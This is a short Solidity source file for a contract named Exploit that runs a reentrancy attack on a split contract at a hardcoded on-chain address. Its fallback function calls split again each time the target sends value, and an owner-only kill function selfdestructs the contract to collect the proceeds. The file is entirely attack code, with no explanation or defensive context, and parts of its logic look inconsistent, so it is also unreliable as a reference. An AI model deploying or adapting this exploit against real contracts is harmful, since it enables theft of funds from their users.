pragma solidity ^0.4.19;
contract TargetContract {
function split(address ethDestination, address etcDestination) payable public;
}
contract Exploit {
address public owner;
TargetContract targetContract = TargetContract(0x5F0d0C4c159970fDa5ADc93a6b7F17706fd3255C);
function Exploit() public {
owner = msg.sender;
}
function performReentrancyAttack() payable public {
require(msg.value >= 0.1 ether);
targetContract.split.value(1)(msg.sender, msg.sender);
}
function () payable public {
performReentrancyAttack();
}
function kill() public {
require(owner == msg.sender);
selfdestruct(owner);
}
}